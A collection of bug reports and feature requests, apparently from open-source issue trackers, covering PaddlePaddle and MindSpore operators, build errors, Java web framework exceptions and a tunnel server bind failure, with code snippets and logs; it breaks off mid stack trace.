Memory/dropout4,fix https://github.com/PaddlePaddle/Paddle/issues/8359 reduce average dropout time from 0.93 -&gt; 0.0894304 result   <code>: thread0::conv2d 13 8.74534 0.289248 1.21766 0.672719 thread0::pool2d_grad 5 1.21376 0.158688 0.43872 0.242752 thread0::batch_norm_grad 14 2.89168 0.082048 0.550208 0.206549 thread0::batch_norm 14 2.74448 0.102784 0.479776 0.196034 thread0::logsigmoid_grad 14 1.54118 0.024 0.325056 0.110085 thread0::dropout_grad 10 0.987232 0.025152 0.315488 0.0987232 thread0::pool2d 5 0.452544 0.043424 0.165984 0.0905088 thread0::dropout 10 0.894304 0.024608 0.312704 0.0894304 thread0::elementwise_add 16 1.30122 0.022528 0.238176 0.081326 thread0::logsigmoid 14 1.13251 0.020864 0.243776 0.0808937 thread0::mul_grad 3 0.234304 0.052768 0.1096 0.0781013 thread0::softmax 1 0.044576 0.044576 0.044576 0.044576
[ST][MS][unique_consecutive]unique_consecutive算子的官网资料中缺少支持平台：Ascend,存在问题：unique_consecutive算子官网资料中缺少支持平台：Ascend 算子官网链接：https://www.mindspore.cn/docs/zh-CN/r1.8/api_python/ops/mindspore.ops.unique_consecutive.html?highlight=unique_consecutive / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_usability_specifications_website_api_simple_001 pytest -s test_usability_specifications_website_api_simple_001.py 在支持平台中显示GPU Ascend 开发责任人：赵英灼   <code>: 支持平台：GPU
cmake errors about SWIG,"I am running the development Docker image: I noticed that the cmake version is 3.5.1: The problem is: if I run without disabling CMake flag , cmake errors as follows: I added a command at to print the content . But it seems that it is empty. However, if I disable SWIG, cmake works good:   <code>: cd ~/work/paddle docker build -t paddle:dev . docker run --rm -it -v $PWD:/paddle paddle:dev /bin/bash λ 16bebedca732 /paddle/build {define_cmake} cmake --version cmake version 3.5.1 cmake .. WITH_SWIG_PY λ 16bebedca732 /paddle/build {define_cmake} cmake .. -- Found Paddle host system: ubuntu -- Found Paddle host system's CPU: 3 cores -- Protobuf protoc executable: /paddle/third_party/install/protobuf/bin/protoc -- Protobuf library: /paddle/third_party/install/protobuf/lib/libprotobuf.a -- BLAS library: /paddle/third_party/install/openblas/lib/libopenblas.a -- Command ""/usr/bin/swig2.0 -swiglib"" failed with output: -- Paddle version is 0.10.0 -- DROP LINT dataproviders/MultiDataProvider.cpp -- DROP LINT dataproviders/MultiDataProvider.h CMake Error at paddle/api/CMakeLists.txt:21 (INCLUDE): include called with wrong number of arguments. include() only takes one file. CMake Error at paddle/api/CMakeLists.txt:58 (SWIG_ADD_MODULE): Unknown CMake command ""SWIG_ADD_MODULE"". -- Configuring incomplete, errors occurred! See also ""/paddle/build/CMakeFiles/CMakeOutput.log"". See also ""/paddle/build/CMakeFiles/CMakeError.log"". message paddle/api/CMakeLists.txt:21 ${SWIG_USE_FILE} λ 16bebedca732 /paddle/build {define_cmake} cmake -D'WITH_SWIG_PY=OFF' .. -- Found Paddle host system: ubuntu -- Found Paddle host system's CPU: 3 cores -- Protobuf protoc executable: /paddle/third_party/install/protobuf/bin/protoc -- Protobuf library: /paddle/third_party/install/protobuf/lib/libprotobuf.a -- BLAS library: /paddle/third_party/install/openblas/lib/libopenblas.a -- Command ""/usr/bin/swig2.0 -swiglib"" failed with output: -- Paddle version is 0.10.0 -- DROP LINT dataproviders/MultiDataProvider.cpp -- DROP LINT dataproviders/MultiDataProvider.h -- Configuring done -- Generating done -- Build files have been written to: /paddle/build"
paddle fluid 1.4的im2sequence op传入的padding参数错误，导致padding无法生效,paddlepaddle版本号： pip install paddlepaddle-gpu==1.4.0.post87 出现的问题： 发现问题，传入的是padding，而不是paddings，所以导致后台无法辨认，修复上述问题后，im2seq的padding参数可以正常使用   <code>: 2. paddle python warper代码
one_hot op不支持double类型 ,"paddle版本1.3 python2.7 发现one_hot这个op不支持float32类型，只能先cast成int32才能正常跑，这点paddle文档上示例代码也是错的 http://www.paddlepaddle.org/documentation/api/en/0.15.0/layers.html#one-hot 报错代码如下 label类型dtype和对应输入改为int32才能正常跑   <code>: def test_one_hot(): with fluid.program_guard(fluid.Program()): label = fluid.layers.data(name='label', shape=[1], dtype='float32') one_hot_label = fluid.layers.one_hot(label, 3) one_hot_label_float = fluid.layers.cast(x=one_hot_label, dtype='float32') place = fluid.CUDAPlace(0) exe = fluid.Executor(place) y = np.array([[2.0], [2.0], [2.0]]) outs = exe.run( feed={'label':y}, fetch_list=[one_hot_label_float]) print(outs[0]) def test_one_hot(): with fluid.program_guard(fluid.Program()): label = fluid.layers.data(name='label', shape=[1], dtype='int32') one_hot_label = fluid.layers.one_hot(label, 3) one_hot_label_float = fluid.layers.cast(x=one_hot_label, dtype='float32') place = fluid.CUDAPlace(0) exe = fluid.Executor(place) y = np.array([[2], [2], [2]]) outs = exe.run( feed={'label':y}, fetch_list=[one_hot_label_float]) print(outs[0])"
【众智】【计算-AICPU开发】ConcatOffset,"ConcatOffset 计算concat输入的偏移量（动态输入输出） Python层接口 （ 与库上现有接口冲突，故改名V1 ） 接口目录：mindspore/ops/operations/_grad_ops.py axis x y 原有接口： N int 属性 axis int 属性 input_x out 其中N代表动态输入输出的数量，参考Concat，改名后作为隐藏属性 对应底层算子 对应底层AICPU算子ConcatOffset 标杆接口参考 Tensorflow接口： https://www.tensorflow.org/api_docs/python/tf/raw_ops/ConcatOffset 3. 异常处理 4. 算子反向 无反向   <code>: class ConcatOffsetV1(Primitive): class ConcatOffset(PrimitiveWithInfer): REG_OP(ConcatOffset) .INPUT(concat_dim, TensorType({DT_INT32})) .DYNAMIC_INPUT(x, TensorType({DT_INT32})) .DYNAMIC_OUTPUT(y, TensorType({DT_INT32})) .REQUIRED_ATTR(N, Int) .OP_END_FACTORY_REG(ConcatOffset)"
【众智】【计算-AICPU接入】SampleDistortedBoundingBoxV2,AICPU算子接入 为图像生成单个随机变形的边界框 接口目录：mindspore/ops/operations/other_ops.py seed int 属性 seed2 int 属性 aspect_ratio_range List(float) 属性 area_range List(float) 属性 max_attempts int 属性 use_image_if_no_bounding_boxes bool 属性 image_size bounding_boxes min_object_covered begin size bboxes 对应底层算子 对应底层AICPU算子SampleDistortedBoundingBoxExt2   <code>: class SampleDistortedBoundingBoxV2 (Primitive):
在一个页面打开一个弹窗，关闭弹窗后页面失去了焦点，必须要用鼠标点击一下页面，才能重新获取焦点,"问题描述：在一个页面打开一个弹窗，关闭弹窗后页面失去了焦点，必须要用鼠标点击一下页面，才能重新获取焦点，我是在页面需要使用扫码枪，监听扫码枪输入（监听键盘输入），再将扫码枪的值赋值给页面的一个input输入框，测试中发现当在页面打开了一个弹窗，或者页面出现一个消息提示框后，扫码枪的监听无效，必须要在弹窗关闭后鼠标随便点击一下页面任意位置，才可以。 测试方法：我是在页面加了一个定时器，观察页面焦点情况 键盘监听的代码： 测试过程中发现当弹窗关闭后控制台打出document.hasFocus()值为false，此时页面没有焦点，键盘输入的监听也无效   <code>: setInterval(function (){ console.log(document.hasFocus()); }, 1000); $(""#sjno"").focus();//扫码枪输入值的input获得焦点 let code = ''; let lastTime, nextTime; let lastCode, nextCode; window.document.onkeypress = (e) =&gt; { if (window.event) { // IE nextCode = e.keyCode; } else if (e.which) { // Netscape/Firefox/Opera nextCode = e.which; } if (nextCode === 13) { if (code.length &lt; 3) return; // 手动输入的时间不会让code的长度大于2，所以这里只会对扫码枪有 console.log(""扫码枪输入内容=""+code); // 获取到扫码枪输入的内容，做别的操作 $(""#sjno"").val(code); $.table.search(); $(""#sjno"").focus();//扫码枪输入值的input获得焦点 code = ''; lastCode = ''; lastTime = ''; return; } nextTime = new Date().getTime(); if (!lastTime &amp;&amp; !lastCode) { code += e.key; } if (lastCode &amp;&amp; lastTime &amp;&amp; nextTime - lastTime &gt; 30) { // 当扫码前有keypress事件时,防止首字缺失 code = e.key; } else if (lastCode &amp;&amp; lastTime) { code += e.key; } lastCode = nextCode; lastTime = nextTime; }"
Need to add CI of build_android back,"Current PR often make the build of mobile failed. When I build for Android using the current develop branch, I met the following error: CMake warning Make error The error is caused by PR https://github.com/PaddlePaddle/Paddle/pull/5476. In fact, there is no need to build the source file . We need to add CI of back to make sure cross-compiling always successful.   <code>: -- Configuring done CMake Error at paddle/testing/CMakeLists.txt:10 (add_dependencies): The dependency target ""paddle_memory"" of target ""paddle_gtest_main"" does not exist. [ 84%] Building CXX object paddle/testing/CMakeFiles/paddle_gtest_main.dir/paddle_gtest_main.cc.o In file included from /home/work/liuyiqun/PaddlePaddle/Paddle/paddle/platform/place.h:19:0, from /home/work/liuyiqun/PaddlePaddle/Paddle/paddle/memory/memory.h:17, from /home/work/liuyiqun/PaddlePaddle/Paddle/paddle/testing/paddle_gtest_main.cc:18: /home/work/liuyiqun/PaddlePaddle/Paddle/paddle/platform/variant.h:17:28: fatal error: boost/config.hpp: No such file or directory #include &lt;boost/config.hpp&gt; ^ compilation terminated. make[2]: *** [paddle/testing/CMakeFiles/paddle_gtest_main.dir/paddle_gtest_main.cc.o] Error 1 make[1]: *** [paddle/testing/CMakeFiles/paddle_gtest_main.dir/all] Error 2 make: *** [all] Error 2 paddle_gtest_main.cc build_android"
【众智】【计算-AICPU开发】LogitGrad,LogitGrad AICPU算子适配 Logit算子的反向 算子原语 接口目录：mindspore/python/mindspore/ops/operations/math_ops.py grad input eps float dx 对应底层算子 对应底层AI CPU算子Logit Classify Name Type TypeRange Required Doc AttrDefault INPUT grad BasicType TRUE INPUT input BasicType TRUE INPUT eps float float FALSE OUTPUT dx BasicType TRUE PyTorch1.8.1接口： torch.logit https://pytorch.org/docs/1.8.1/generated/torch.logit.html 3. 异常处理 4. 算子反向 参考torch/tools/autograd/derivatives.yaml: logit_backward_kernel   <code>: class Logit(Primitive):
代码生成菜单里导入功能报异常,"虽然不影响程序运行，但是强迫症受不了 通过查阅资料与尝试，是缺少了 com.github.jsqlparser POM导入后可解决   <code>: 14:41:02.270 [http-nio-80-exec-2] DEBUG c.r.g.m.G.selectGenTableList_COUNT - [debug,137] - ==&gt; Preparing: SELECT count(0) FROM gen_table 14:41:02.271 [http-nio-80-exec-2] DEBUG c.r.g.m.G.selectGenTableList_COUNT - [debug,137] - ==&gt; Parameters: 14:41:02.274 [http-nio-80-exec-2] DEBUG c.r.g.m.G.selectGenTableList_COUNT - [debug,137] - &lt;== Total: 1 14:41:03.487 [http-nio-80-exec-9] DEBUG c.r.g.m.G.selectDbTableList_COUNT - [debug,137] - ==&gt; Preparing: select count(0) from ( select table_name, table_comment, create_time, update_time from information_schema.tables where table_schema = (select database()) AND table_name NOT LIKE 'QRTZ_%' AND table_name NOT LIKE 'gen_%' AND table_name NOT IN (select table_name from gen_table) ) tmp_count 14:41:03.498 [http-nio-80-exec-9] DEBUG c.r.g.m.G.selectDbTableList_COUNT - [debug,137] - ==&gt; Parameters: 14:41:03.508 [http-nio-80-exec-9] DEBUG c.r.g.m.G.selectDbTableList_COUNT - [debug,137] - &lt;== Total: 1 14:41:03.521 [http-nio-80-exec-9] WARN c.g.p.p.OrderByParser - [converToOrderBySql,67] - 处理排序失败: net.sf.jsqlparser.JSQLParserException: Encountered unexpected token: ""="" ""="" at line 2, column 22. Was expecting one of: ""&amp;"" ""&amp;&amp;"" ""::"" "";"" ""&lt;&lt;"" ""&gt;&gt;"" ""AND"" ""AT"" ""COLLATE"" ""CONNECT"" ""FOR"" ""GROUP"" ""HAVING"" ""OR"" ""START"" ""XOR"" ""["" ""^"" ""|"" &lt;EOF&gt; ，降级为直接拼接 order by 参数 14:41:03.522 [http-nio-80-exec-9] DEBUG c.r.g.m.G.selectDbTableList - [debug,137] - ==&gt; Preparing: select table_name, table_comment, create_time, update_time from information_schema.tables where table_schema = (select database()) AND table_name NOT LIKE 'QRTZ_%' AND table_name NOT LIKE 'gen_%' AND table_name NOT IN (select table_name from gen_table) order by create_time desc LIMIT ? 14:41:03.523 [http-nio-80-exec-9] DEBUG c.r.g.m.G.selectDbTableList - [debug,137] - ==&gt; Parameters: 10(Integer) 14:41:03.559 [http-nio-80-exec-9] DEBUG c.r.g.m.G.selectDbTableList - [debug,137] - &lt;== Total: 10 &lt;dependency&gt; &lt;groupId&gt;com.github.jsqlparser&lt;/groupId&gt; &lt;artifactId&gt;jsqlparser&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;/dependency&gt;"
 bug in math library gemm,"call the in math library, it throw with when the matrix need to transpose, the call parameter of , is wrong in . this is related to #3577:Gan demo . I am working on to fix it.   <code>: matmul 121: Intel MKL ERROR: Parameter 11 was incorrect on entry to cblas_sgemm. 121: I0818 21:38:22.118356 16873 mul_op.h:70] after gemm 121: 121: Intel MKL ERROR: Parameter 9 was incorrect on entry to cblas_sgemm. 121: F. ldb ldc cblas_sgemm."
在训练过程中不断吃显存，直到显存不足,"项目：DeepSpeech issue PaddlePaddle 1.8 CUDA 10 Docker 显卡：2080ti 11G 我使用的是docker进行训练，显存为11G，一开始训练只占8G左右，但在训练过程中会出现不断吃显存，直到显存不足挂掉。设置小batch_size也没有用的。 请问这个问题如何解决？   <code>: export FLAGS_sync_nccl_allreduce=0 export FLAGS_eager_delete_tensor_gb=0 export FLAGS_fraction_of_gpu_memory_to_use=0.98 CUDA_VISIBLE_DEVICES=0,1 python train.py"
表字段包含oracle关键字时生成的sql有问题，导致执行报错,"insert直接报错,直接调用代码生成器生成的接口 log如下 [DEBUG][2017-11-13 11:51:06,495][com.test.dao.LivingRoomDao.insert]==&gt; Preparing: INSERT INTO SYS_LIVING_ROOM ( id, room_name, ' ) VALUES ( ?, ?, ? ) [ERROR][2017-11-13 11:51:06,527][com.alibaba.druid.filter.stat.StatFilter]merge sql error, dbType oracle, sql : INSERT INTO SYS_LIVING_ROOM ( id, room_name, ( ?, ?, com.alibaba.druid.sql.parser.ParserException: ERROR. token : ERROR, pos : 80 原因是表中包含type,name等关键字这里生成的sql有问题导致的 测试表 create table SYS_LIVING_ROOM ( id VARCHAR2(32) CONSTRAINT PK_SYS_LIVING_ROOM_ID PRIMARY KEY, room_name VARCHAR2(200), school_id VARCHAR2(32), type VARCHAR2(32) )   <code>: ' ) VALUES ? )"
paddle::PaddlePredictor Clone()   ZeroCopyRun() 不是线程安全的,"paddle::PaddlePredictor Clone() + ZeroCopyRun() 不是线程安全的 1）PaddlePaddle版本：1.6 2）CPU： 3）系统环境：centos -预测信息 1）C++预测：   <code>: const auto predictor = _executor-&gt;Clone(); std::unique_ptr&lt;paddle::ZeroCopyTensor&gt; auto input_t = predictor-&gt;GetInputTensor(""word""); input_t-&gt;Reshape({seq_len, 1}); input_t-&gt;SetLoD({lod_input}); input_t-&gt;copy_from_cpu&lt;int64_t&gt;(input_ids.data()); // data() 数据指针 // 模型推理 if (!predictor-&gt;ZeroCopyRun()) { return false; }"
Excel导出1万条数据时报错,"环境信息 pigx版本: 3.11.0 是否修改包名: 否 提供详细 代码如下： @ResponseExcel(name = ""供应商列表"", sheet = ""供应商列表"") @ApiOperation(value = ""excel导出"", notes = ""excel导出"") @SysLog(""excel导出"") @GetMapping(""/excelOut/{cateGoryArr}"") @PreAuthorize(""@pms.hasPermission('ksinfomation_zgdjuserksinformation_edit')"") public List excelOut(@PathVariable(""cateGoryArr"") String cateGoryArr) throws ParseException { List excelOutDataList = new ArrayList&lt;&gt;(); // excel返回实体 错误日志如下： org.springframework.web.util.NestedServletException: Request processing failed; nested exception is com.alibaba.excel.exception.ExcelGenerateException: Can not close IO. at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) at javax.servlet.http.HttpServlet.service(HttpServlet.java:497) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:584) at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:320) at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:126) at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:90) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:118) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:137) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:111) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:158) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.oauth2.provider.authentication.OAuth2AuthenticationProcessingFilter.doFilter(OAuth2AuthenticationProcessingFilter.java:176) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:116) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:92) at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:77) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:105) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:56) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:215) at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:178) at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:358) at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:271) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at com.pig4cloud.pigx.common.data.tenant.TenantContextHolderFilter.doFilter(TenantContextHolderFilter.java:65) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132) at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:269) at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:78) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:133) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:130) at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:249) at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:78) at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:99) at io.undertow.server.Connectors.executeRootHandler(Connectors.java:370) at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:836) at org.jboss.threads.ContextClassLoaderSavingRunnable.run(ContextClassLoaderSavingRunnable.java:35) at org.jboss.threads.EnhancedQueueExecutor.safeRun(EnhancedQueueExecutor.java:2019) at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.doRunTask(EnhancedQueueExecutor.java:1558) at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1449) at java.lang.Thread.run(Thread.java:748) Caused by: com.alibaba.excel.exception.ExcelGenerateException: Can not close IO. at com.alibaba.excel.context.WriteContextImpl.finish(WriteContextImpl.java:378) at com.alibaba.excel.write.ExcelBuilderImpl.finish(ExcelBuilderImpl.java:95) at com.alibaba.excel.ExcelWriter.finish(ExcelWriter.java:329) at com.pig4cloud.plugin.excel.handler.SingleSheetWriteHandler.write(SingleSheetWriteHandler.java:58) at com.pig4cloud.plugin.excel.handler.AbstractSheetWriteHandler.export(AbstractSheetWriteHandler.java:60) at com.pig4cloud.plugin.excel.aop.ResponseExcelReturnValueHandler.lambda$handleReturnValue$1(ResponseExcelReturnValueHandler.java:56) at java.util.Optional.ifPresent(Optional.java:159) at com.pig4cloud.plugin.excel.aop.ResponseExcelReturnValueHandler.handleReturnValue(ResponseExcelReturnValueHandler.java:56) at org.springframework.web.method.support.HandlerMethodReturnValueHandlerComposite.handleReturnValue(HandlerMethodReturnValueHandlerComposite.java:82) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:123) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:878) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:792) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ... 89 common frames omitted Caused by: java.io.IOException: This archive contains unclosed entries. at org.apache.commons.compress.archivers.zip.ZipArchiveOutputStream.finish(ZipArchiveOutputStream.java:467) at org.apache.poi.xssf.streaming.SXSSFWorkbook.injectData(SXSSFWorkbook.java:409) at org.apache.poi.xssf.streaming.SXSSFWorkbook.write(SXSSFWorkbook.java:939) at com.alibaba.excel.context.WriteContextImpl.finish(WriteContextImpl.java:339) ... 104 common frames omitted   <code>: // 业务代码，取一万条数据导出 excelOutDataList.add(excelOutData); } return excelOutDataList; }"
在flask中使用动态图模式，会卡死,"版本: paddle 1.8.3 cpu 当在flask上将输入转化为tensor 之后 使用 + - * / 等运算会卡死在原地 同时 也不能正常的使用return ` ` 当使用上述代码时 程序将会一直卡在return 这个地方并且不会返回，并且如果使用tensor去进行+ - / * 运算也会卡死在相对应处   <code>: @app.route('/selfie2anime',methods = ['POST','GET']) def face2anime(): if request.method == 'POST': selfie_file = request.files['selfie_file'] selfie_file.save(""ActivitySelfie2anime/selfie_file.jpg"") with fluid.dygraph.guard(): genA2B = ResnetGenerator(in_channels=3, out_channels=3, ngf= 64, n_blocks=4) genA2B_para, _ = fluid.load_dygraph(""ActivitySelfie2anime/Parameters/genA2B124.pdparams"") genA2B.load_dict(genA2B_para) img = np.array(Image.open(""ActivitySelfie2anime/selfie_file.jpg"").convert(""RGB"")).astype(np.float32) img = cv2.resize(img,(256, 256)) img = img / 255. img = (img - 0.5) / 0.5 img = totensor(img) fakeA2B, _ , _ = genA2B(img) fakeA2B = (denorm(tensor2numpy(fakeA2B[0])) * 255).astype(np.uint8) fakeA2B = Image.fromarray(fakeA2B) fakeA2B.save(""ActivitySelfie2anime/anime.jpg"") anime_image = np.linspace(0,255,256*256*3).reshape(256,256,-1).astype(np.uint8) ret,buf = cv2.imencode("".jpg"",anime_image) anime_image = Image.fromarray(np.uint8(buf)).tobytes() resp = make_response(anime_image) resp.headers['Anime-Type'] = 'image/jpeg' print(resp) return resp"
Need to change the attribute is_test of batch_norm op to true in test_program and inference_program,"There is a kind of operators which behaves differently in training and testing phase. They holds a attribute to distinguish the type of task, such as batch_norm_op and dropout_op. We need to set to in test_program and inference_program.   <code>: is_test is_test true"
关于BaseService中@Autowide  Mapper<T> 找不到bean,"springmvc mybatis 项目中 springmvc 1 第一顺位加载 然后再是其他spring配置文件加载，比如spring-mybatis.xml 扫描mapper-bean的xml 按照您示例上面的 这时候启动就会报错。 没有合格的Mapper Bean error create bean DemoService 当然按照您的示例，junit测试只加载myabtis-spring 配置是没有错的。麻烦看下   <code>: @Service public abstract class BaseService&lt;T&gt; { @Autowired protected Mapper&lt;T&gt; mapper; public int save(T entity){ return mapper.insert(entity); } public int delete(T entity){ return mapper.deleteByPrimaryKey(entity); } /** * 单表分页查询 * * @param pageNum * @param pageSize * @return */ public List&lt;T&gt; selectPage(int pageNum,int pageSize){ PageHelper.startPage(pageNum, pageSize); //Spring4支持泛型注入 return mapper.select(null); } } @Service public class DemoService extends BaseService&lt;Country2&gt;{ }"
阿里云centos上服务端启动不了,"是什么问题，对centos系统版本有要求吗   <code>: [root@iZbp13m488196desr77aezZ FastTunnel.Server.linux-x64]# ./FastTunnel.Server 2021/01/31 16:50:51.995|DEBUG|===== FastTunnel Server Start ===== 2021/01/31 16:50:52.284|DEBUG|FastTunnel Server Start 2021/01/31 16:50:52.311|ERROR|System.Net.Sockets.SocketException (99): Cannot assign requested address at System.Net.Sockets.Socket.UpdateStatusAfterSocketErrorAndThrowException(SocketError error, String callerName) at System.Net.Sockets.Socket.DoBind(EndPoint endPointSnapshot, SocketAddress socketAddress) at System.Net.Sockets.Socket.Bind(EndPoint localEP) at FastTunnel.Core.Listener`1..ctor(String ip, Int32 port, ILogger`1 logerr, Action`2 acceptCustomerHandler, T data) at FastTunnel.Core.Core.FastTunnelServer.ListenFastTunnelClient() at FastTunnel.Core.Core.FastTunnelServer.Run() at FastTunnel.Server.Program.Run(IServiceProvider servicesProvider) at FastTunnel.Server.Program.Main(String[] args) Cannot assign requested address System.Net.Sockets.SocketException (99): Cannot assign requested address at System.Net.Sockets.Socket.UpdateStatusAfterSocketErrorAndThrowException(SocketError error, String callerName) at System.Net.Sockets.Socket.DoBind(EndPoint endPointSnapshot, 